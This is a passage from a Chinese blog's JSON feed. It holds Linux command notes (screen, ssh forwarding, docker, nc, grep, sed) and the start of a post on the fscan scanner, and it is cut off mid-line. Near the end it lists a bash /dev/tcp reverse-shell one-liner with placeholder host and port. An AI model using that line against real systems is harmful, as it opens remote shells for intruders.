function\">screen</span> <span class=\"token parameter variable\">-r</span> 作业序号或者名称  <span class=\"token comment\"># 进入已离线（Detached）作业</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-d</span> 作业名称  <span class=\"token comment\">#远程结束某个作业</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>设置缓存：输入 Crtl + a + <span class=\"token builtin class-name\">:</span> 再输入 scrollback <span class=\"token number\">1234</span>，代表设置窗口缓存为1234行。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>查看历史信息：Ctrl + a + Esc，进入 “copy mode” ，然后就可以查看历史信息，甚至可以使用vim命令。按 esc 退出。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Crtl-a  +d     保存进程并退出作业<span class=\"token punctuation\">(</span>程序在screen中继续运行，screen <span class=\"token parameter variable\">-ls</span> 可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Crtl-a + k 或exit    退出作业和进程<span class=\"token punctuation\">(</span>程序终止，screen <span class=\"token parameter variable\">-ls</span> 不可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token parameter variable\">-4</span>             仅将主机名解析到IPv4地址</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token parameter variable\">-6</span>             仅将主机名解析到IPv6地址</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token parameter variable\">-A</span> 　          将所有的视窗适应当前终端屏幕的大小</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token parameter variable\">-d</span>  　         将指定的screen作业离线</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token parameter variable\">-h</span> lines 　    指定视窗的缓冲区行数</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token parameter variable\">-m</span>             即使目前已在作业中的screen作业，仍强制建立新的screen作业</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token parameter variable\">-r</span>             恢复<span class=\"token punctuation\">(</span>Reattach<span class=\"token punctuation\">)</span>离线<span class=\"token punctuation\">(</span>detach<span class=\"token punctuation\">)</span>的screen作业</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token parameter variable\">-R</span> 　          先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token parameter variable\">-s</span> shell　     建立新视窗时<span class=\"token punctuation\">(</span>使用shell，而不是<span class=\"token environment constant\">$SHELL</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token parameter variable\">-S</span>             创建并指定screen作业的名称</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token parameter variable\">-U</span>             指定screen使用UTF-8编码</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token parameter variable\">-v</span> 　          显示版本信息</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token parameter variable\">-x</span> 　          进入<span class=\"token punctuation\">(</span>Attach<span class=\"token punctuation\">)</span>之前离线的screen作业</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>-ls或-list 　  显示目前所有的screen作业</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token parameter variable\">-wipe</span> 　       检查目前所有的screen作业，并删除已经无法使用的screen作业</pre></td></tr></table></figure><h1 id=\"ssh\"><a class=\"anchor\" href=\"#ssh\">#</a> ssh</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDg4MjU0NDk=\">https://zhuanlan.zhihu.com/p/148825449</span></p>\n<ol>\n<li>\n<p>基本连接：A【本地请求】——&gt;B【远程接收】</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>本地端口转发【内网】：A:X——&gt;B——&gt;C:Z</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-L</span> 主机A的端口X:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>远程端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-R</span> 主机B的端口Y:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>动态端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-D</span> 主机A的端口X username@hostname</pre></td></tr></table></figure></li>\n</ol>\n<p><strong>安装开启 ssh 服务</strong></p>\n<pre><code>apt-get update\napt-get install ssh\nservice ssh start\nservice postgresql start\nvi /etc/ssh/sshd_config\n将PermitRootLogin改为yes 使它能够使用密码进行登录\n保存退出，重启\n/etc/init.d/ssh restart\n</code></pre>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li><code>netstat -tanlp</code></li>\n<li><code>Kill xxxx</code></li>\n</ol>\n<h1 id=\"docker\"><a class=\"anchor\" href=\"#docker\">#</a> docker</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 安装 docker</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> docker-ce <span class=\"token parameter variable\">-y</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装后查看 docker 版本</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">-v</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 启动 docker</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>systemctl start <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 停止 docker</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>systemctl stop <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 重启 docker</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 查看 docker 状态</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>systemctl status <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 开机启动</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>systemctl <span class=\"token builtin class-name\">enable</span> <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>systemctl unenable <span class=\"token function\">docker</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 查看 docker 概要信息</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">docker</span> info </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 查看 docker 帮助文档</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 阿里云镜像加速</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /etc/docker</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/docker/daemon.json <span class=\"token operator\">&lt;&lt;-</span><span class=\"token string\">'EOF'</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  \"registry-mirrors\": [\"https://73z5h6yb.mirror.aliyuncs.com\"]</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>EOF</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">sudo</span> systemctl daemon-reload</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># 停止容器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">docker</span> stop ID</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 删除容器</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">rm</span> ID</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 删除镜像</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">docker</span> rmi ID</pre></td></tr></table></figure><h1 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h1>\n<p>监听端口服务，传输文件，反监听</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nc <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>监听本地 nc <span class=\"token operator\">-</span>lvp <span class=\"token number\">6666</span></pre></td></tr></table></figure><h1 id=\"拼接符\"><a class=\"anchor\" href=\"#拼接符\">#</a> 拼接符</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&amp;</span>是不管前后命令是否执行成功都会执行前后命令</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span>是前面的命令执行成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">||</span>是前面的命令执行不成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span>管道符</pre></td></tr></table></figure><h1 id=\"etchosts\"><a class=\"anchor\" href=\"#etchosts\">#</a> /etc/hosts</h1>\n<p>修改主机文件，IP 地址与域名快速解析</p>\n<h1 id=\"wget\"><a class=\"anchor\" href=\"#wget\">#</a> wget</h1>\n<p>下载文件</p>\n<h1 id=\"mkdir\"><a class=\"anchor\" href=\"#mkdir\">#</a> mkdir</h1>\n<p><code>mkdir -p</code>  确保目录名称存在</p>\n<h1 id=\"ls-a\"><a class=\"anchor\" href=\"#ls-a\">#</a> ls -a</h1>\n<p>显示当前目录中的所有文件和目录，包括<strong>隐藏</strong>文件</p>\n<p><code>cat .flag.txt</code>  打开隐藏的 txt</p>\n<h1 id=\"文件权限\"><a class=\"anchor\" href=\"#文件权限\">#</a> 文件权限</h1>\n<p>文件只读 read-only =&gt; 需要修改文件</p>\n<p>进入目录 <code>sudo chmod a+w 文件名</code></p>\n<p>或者是因为当前权限不够，文件只读，su root 即可</p>\n<h1 id=\"软硬链接\"><a class=\"anchor\" href=\"#软硬链接\">#</a> 软 / 硬链接</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xFT04xNzQxL2FydGljbGUvZGV0YWlscy8xMDAxMzY0NDk=\">浅谈 linux 中的硬链接和软链接文件以及 ln 的使用方法</span></p>\n<p>重定向软链接及搜索当前目录下的所有软链接</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 不加 - s 为硬链接，硬链接相当于源文件改名，软链接是新文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span>   /tmp/aaa.sh /home/link    //在home下创建一个名为link的软链接，指向/tmp/aaa.sh</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ln</span> <span class=\"token parameter variable\">-snf</span> /tmp/bbb.sh /home/link    //修改home下的link的软链接指向为/tmp/bbb.sh</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">find</span> ./ <span class=\"token parameter variable\">-type</span> l　　＃注意最后是小写的Ｌ</pre></td></tr></table></figure><h1 id=\"grep\"><a class=\"anchor\" href=\"#grep\">#</a> grep</h1>\n<p>查找文件里符合条件的字符串或正则表达式</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> pattern <span class=\"token punctuation\">[</span>files<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 文件 file.txt 中查找字符串 \"hello\"，并打印匹配的行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">grep</span> hello file.txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 文件夹 dir 中递归查找所有文件中匹配正则表达式 \"pattern\" 的行，并打印匹配行所在的文件名和行号</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> pattern dir/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 标准输入中查找字符串 \"world\"，并只打印匹配的行数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"hello world\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-c</span> world</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token builtin class-name\">test</span> *file </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 递归的方式查找符合条件的文件</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> update /etc/acpi</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 通过 \"-v\" 参数可以打印出不符合条件行的内容</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-v</span> <span class=\"token builtin class-name\">test</span> *test*</pre></td></tr></table></figure><h1 id=\"tail\"><a class=\"anchor\" href=\"#tail\">#</a> tail</h1>\n<p>tail 命令可用于查看文件的内容，有一个常用的参数 <strong>-f</strong> 常用于查阅正在改变的日志文件。</p>\n<p><code>tail -f filename</code>  会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>文件<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 显示 notes.log 文件的最后 10 行，默认显示最后 10 行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">tail</span> notes.log</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 跟踪名为 notes.log 的文件的增长情况，显示 notes.log 文件的最后 10 行，添加行后，会继续显示这些行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token parameter variable\">-f</span> notes.log</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 显示文件 notes.log 的内容，从第 20 行至文件末尾:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token parameter variable\">-n</span> +20 notes.log</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 显示文件 notes.log 的最后 10 个字符</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token parameter variable\">-c</span> <span class=\"token number\">10</span> notes.log</pre></td></tr></table></figure><h1 id=\"touch\"><a class=\"anchor\" href=\"#touch\">#</a> touch</h1>\n<p>Linux touch 命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">touch</span> <span class=\"token punctuation\">[</span>-acfm<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-d<span class=\"token operator\">&lt;</span>日期时间<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-r<span class=\"token operator\">&lt;</span>参考文件或目录<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-t<span class=\"token operator\">&lt;</span>日期时间<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--version<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>文件或目录…<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 使用指令 \"touch\" 修改文件 \"testfile\" 的时间属性为当前系统时间</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">touch</span> testfile</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看文件的时间属性</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> testfile </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 创建空白文件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">touch</span> <span class=\"token function\">file</span></pre></td></tr></table></figure><h1 id=\"locate\"><a class=\"anchor\" href=\"#locate\">#</a> locate</h1>\n<p>查找符合条件的文档，他会去保存文档和目录名称的数据库内，查找合乎范本样式条件的文档或目录。</p>\n<p>一般情况我们只需要输入  <code>locate your_file_name</code>  即可查找指定文件。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">locate</span> <span class=\"token punctuation\">[</span>-d <span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--version<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>范本样式<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 查找 passwd 文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">locate</span> <span class=\"token function\">passwd</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 搜索 etc 目录下所有以 sh 开头的文件</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">locate</span> /etc/sh</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 忽略大小写搜索当前用户目录下所有以 r 开头的文件 </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">locate</span> <span class=\"token parameter variable\">-i</span> ~/r</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">locate</span> 与 <span class=\"token function\">find</span> 不同: <span class=\"token function\">find</span> 是去硬盘找，locate 只在/var/lib/slocate 资料库中找。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">locate</span> 的速度比 <span class=\"token function\">find</span> 快，它并不是真的查找，而是查数据库，一般文件数据库在 /var/lib/slocate/slocate.db 中，所以 <span class=\"token function\">locate</span> 的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库 ，命令为：</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>updatedb</pre></td></tr></table></figure><h1 id=\"less\"><a class=\"anchor\" href=\"#less\">#</a> less</h1>\n<p>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 查看文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">less</span> log2013.log</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># ps 查看进程信息并通过 less 分页显示</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span><span class=\"token function\">less</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 查看命令历史使用记录并通过 less 分页显示</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">history</span> <span class=\"token operator\">|</span> <span class=\"token function\">less</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 浏览多个文件</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">less</span> log2013.log log2014.log</pre></td></tr></table></figure><h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> &gt;&gt;、&gt;、&lt;</h1>\n<p>linux 中经常会用到将内容输出到某文件当中，只需要在执行命令后面加上 &gt; 或者 &gt;&gt; 号即可进入操作。</p>\n<p>&gt;：将一条命令执行结果（标准输出，或者错误输出，本来都要打印到屏幕上面的）<strong>重定向</strong>其它输出设备（文件，打开文件操作符，或打印机等等）</p>\n<p>&lt; 号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p>\n<p>&gt;&gt; 是追加内容，&gt; 是覆盖原有内容</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'abc'</span> <span class=\"token operator\">></span> test.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'123'</span> <span class=\"token operator\">>></span> test.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 导入数据</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-h</span> <span class=\"token builtin class-name\">test</span> <span class=\"token operator\">&lt;</span> test.sql</pre></td></tr></table></figure><h1 id=\"sed\"><a class=\"anchor\" href=\"#sed\">#</a> sed</h1>\n<p>Linux sed 命令是利用脚本来处理文本文件。</p>\n<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>\n<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token punctuation\">[</span>-hnV<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-e<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-f<span class=\"token operator\">&lt;</span>script文件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>文本文件<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 在 testfile 文件的第四行后添加一行，并将结果输出到标准输出，在命令行提示符下输入如下命令</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$ <span class=\"token function\">sed</span> <span class=\"token parameter variable\">-e</span> 4a<span class=\"token punctuation\">\\</span>newLine testfile </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>HELLO LINUX<span class=\"token operator\">!</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Linux is a <span class=\"token function\">free</span> unix-type opterating system.  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>This is a linux testfile<span class=\"token operator\">!</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Linux <span class=\"token builtin class-name\">test</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>newLine</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Google</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 将 testfile 的内容列出并且列印行号，同时将第 2~5 行删除</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">nl</span> testfile <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token string\">'2,5d'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 只删除第 2 行</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">nl</span> testfile <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token string\">'2d'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 删除第 3 到最后一行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">nl</span> testfile <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token string\">'3,$d'</span></pre></td></tr></table></figure><ul>\n<li>ssh，tty 连内核终端模拟器，pts 连 ptms</li>\n<li>lsof /.../ 显示进程</li>\n<li>hash -l 显示哈希缓存，-r /-d name 清缓存</li>\n<li>history</li>\n<li>快捷键\n<ul>\n<li>Ctrl+l 清屏，z 挂起，a 行首，e 行尾，f 左移，b 右移，xx 前后移动，p 重复前一个命令</li>\n<li>!! 重复前一个命令</li>\n</ul>\n</li>\n<li>find</li>\n<li>管道符｜，左边输出作为右边输入</li>\n<li>gzip，gunzip，bzip，bunzip2，xz，unxz，tar</li>\n<li>mount 挂载</li>\n<li>stat 查看文件状态，touch -a/-m/-t</li>\n<li>rename</li>\n<li>rm 删除可 extundelete 恢复 shred -zvun 删除不可恢复</li>\n<li>ln 硬连接 - 改名，软连接 - s - 新文件</li>\n<li>IO 重定向，1&gt;/&gt; 标准输出，2 &gt; 标准错误输出，&amp;</li>\n<li>反弹 shell <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></li>\n<li>echo</li>\n</ul>\n",
            "tags": [
                "Web",
                "Linux"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "url": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "title": "Web常用工具",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"fscan\"><a class=\"anchor\" href=\"#fscan\">#</a> fscan</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZpdmVyeWEvYXJ0aWNsZS9kZXRhaWxzLzEyNzkwMzU2OQ==\">https://blog.csdn.net/Fiverya/article/details/127903569</span></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>shadow1ng<span class=\"token operator\">/</span>fscan<span class=\"token punctuation\">.</span>git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>wget https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>dl<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>tar <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span> <span class=\"token operator\">-</span>xzf go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Go环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>vim ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>┌──<span class=\"token punctuation\">(</span>root💀kali<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token punctuation\">[</span>~<span 